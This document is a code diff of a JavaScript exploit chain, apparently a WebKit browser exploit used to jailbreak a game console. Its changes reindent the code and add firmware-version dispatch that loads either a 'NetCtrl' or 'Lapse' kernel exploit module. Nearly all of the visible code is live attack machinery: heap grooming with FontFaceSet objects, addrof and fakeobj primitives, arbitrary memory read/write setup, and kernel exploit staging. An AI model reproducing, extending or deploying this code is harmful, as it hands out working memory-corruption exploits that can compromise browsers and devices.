@@ -10,26 +10,26 @@ var HAMMER_FONT_NAME = "font8"; //must take bucket 3 of 8 (counting from zero)
 var HAMMER_NSTRINGS = 700; //tweak this if crashing during hammer time
 
 function poc() {
-	addEventListener('error', event => {
-    const reason = event.error;
-    alert(
-        'Unhandled error\n'
-        + `${reason}\n`
-        + `${reason.sourceURL}:${reason.line}:${reason.column}\n`
-        + `${reason.stack}`
-    );
-    return true;
-});
+    addEventListener('error', event => {
+        const reason = event.error;
+        alert(
+            'Unhandled error\n'
+            + `${reason}\n`
+            + `${reason.sourceURL}:${reason.line}:${reason.column}\n`
+            + `${reason.stack}`
+        );
+        return true;
+    });
 
-addEventListener('unhandledrejection', event => {
-    const reason = event.reason;
-    alert(
-        'Unhandled rejection\n'
-        + `${reason}\n`
-        + `${reason.sourceURL}:${reason.line}:${reason.column}\n`
-        + `${reason.stack}`
-    );
-});
+    addEventListener('unhandledrejection', event => {
+        const reason = event.reason;
+        alert(
+            'Unhandled rejection\n'
+            + `${reason}\n`
+            + `${reason.sourceURL}:${reason.line}:${reason.column}\n`
+            + `${reason.stack}`
+        );
+    });
 
     var union = new ArrayBuffer(8);
     var union_b = new Uint8Array(union);
@@ -151,7 +151,7 @@ addEventListener('unhandledrejection', event => {
         mkString(HASHMAP_BUCKET, p_s);
 
     var needfix = [];
-    for (var i = 0;; i++) {
+    for (var i = 0; ; i++) {
         ffses["ffs_leak_" + i] = new FontFaceSet([bad_fonts[guessed_font], bad_fonts[guessed_font + 1], good_font]);
         var badstr2 = mkString(HASHMAP_BUCKET, p_s);
         needfix.push(mkString(HASHMAP_BUCKET, p_s));
@@ -208,7 +208,7 @@ addEventListener('unhandledrejection', event => {
 
     while (jsvalue_leak === null) {
         Object.defineProperties({}, props);
-        for (var i = 0;; i++) {
+        for (var i = 0; ; i++) {
             if (fastmalloc.charCodeAt(i) == 0x42 &&
                 fastmalloc.charCodeAt(i + 1) == 0x44 &&
                 fastmalloc.charCodeAt(i + 2) == 0x43 &&
@@ -328,7 +328,7 @@ addEventListener('unhandledrejection', event => {
     }
 
 
-	
+
     window.addrof = function (x) {
         obj_slave.obj = x;
         return i48_get(obj_master);
@@ -378,7 +378,7 @@ addEventListener('unhandledrejection', event => {
 
 
 
-	
+
     (function () {
         var magic = boot_fakeobj(boot_addrof(obj) + 16);
         magic[4] = addrof_slave;
@@ -409,12 +409,12 @@ addEventListener('unhandledrejection', event => {
     //^ @sleirs' stuff. anything pre arb rw is magic, I'm happy I don't have to deal with that.
 
     //create compat stuff for kexploit.js
-  // var expl_master = new Uint32Array(8);
-  //  var expl_slave = new Uint32Array(2);
+    // var expl_master = new Uint32Array(8);
+    //  var expl_slave = new Uint32Array(2);
 
-var shared_buf = new ArrayBuffer(0x1000);  
-var expl_master = new Uint32Array(shared_buf);
-var expl_slave = new DataView(shared_buf);	
+    var shared_buf = new ArrayBuffer(0x1000);
+    var expl_master = new Uint32Array(shared_buf);
+    var expl_slave = new DataView(shared_buf);
 
     var addrof_expl_slave = addrof(expl_slave);
     var m = fakeobj(addrof(obj) + 16);
@@ -425,50 +425,56 @@ var expl_slave = new DataView(shared_buf);
     m[5] = (addrof_expl_slave - addrof_expl_slave % 0x100000000) / 0x100000000;
     m[7] = 1;
 
-log("WEBKIT EXPLOIT FINISH");
+    log("WEBKIT EXPLOIT FINISH");
 
- async function load_lapse() {
-//  const { Memory } = await import('./module/mem.mjs');
-//  const { Int: Int64 } = await import('./module/int64.mjs');
+    async function load_lapse() {
+        let mod = await import('./module/mem.mjs');
+        let imod = await import('./module/int64.mjs');
+        let config = await import('./config.mjs');
+
+        const Memory = mod.Memory;
+        const Int64 = imod.Int;
+
+        const obj = { addr: null, 0: 0 };
+
+        const rawPtr = window.addrof(obj);
+
+        const btRaw = window.read_ptr_at(rawPtr + 8);
+
+        const obj_p = new Int64(rawPtr >>> 0, (rawPtr / 0x100000000) >>> 0);
+        const obj_bt = new Int64(btRaw >>> 0, (btRaw / 0x100000000) >>> 0);
+
+        const off0x10 = new Int64(0x10, 0);
+
+        new Memory(
+            expl_master,
+            expl_slave,
+            obj,
+            obj_p.add(off0x10),
+            obj_bt
+        );
+
+        const target = config.target;
+        const ver = target & 0xFFFF; // 0xMmm (e.g. 0x900)
+
+        // Versions >= 12.50 use NetCtrl
+        if (ver >= 0x1250) {
+            log("Detected FW >= 12.50. Loading NetCtrl Exploit...");
+            try {
+                const netctrl = await import('./extensions/netctrl.mjs');
+                await netctrl.load(expl_master, expl_slave, obj, obj_p.add(off0x10));
+            } catch (e) {
+                log("NetCtrl Exploit Failed: " + e);
+                alert("NetCtrl Failed: " + e);
+            }
+        } else {
+            log("Detected FW < 12.50. Loading Lapse Exploit...");
+            await import('./lapse.mjs');
+        }
+    }
 
 
-let mod = await import('./module/mem.mjs');
-  let imod = await import('./module/int64.mjs');
 
-  const Memory = mod.Memory;
-  const Int64 = imod.Int;
-	
-  const obj = { addr: null, 0: 0 };
+    load_lapse();
 
-  
-  const rawPtr = window.addrof(obj);
-//  alert("rawPtr = 0x" + rawPtr.toString(16));
-
-  const btRaw = window.read_ptr_at(rawPtr + 8);
- // alert("butterfly raw = 0x" + btRaw.toString(16));
-
-
-  const obj_p = new Int64(rawPtr >>> 0, (rawPtr / 0x100000000) >>> 0);
-  const obj_bt = new Int64(btRaw  >>> 0, (btRaw  / 0x100000000) >>> 0);
-
-  const off0x10 = new Int64(0x10, 0);
-// const master_b = new Uint32Array(new ArrayBuffer(1));  
- // const slave_b  = new DataView   (new ArrayBuffer(1)); 
-  new Memory(
-    expl_master,
-    expl_slave,
-    obj,
-    obj_p.add(off0x10),
-    obj_bt
-  );
-
-	  import('./lapse.mjs'); 
-
- 
-}
-  
-
- 
-   load_lapse();
- 
 }
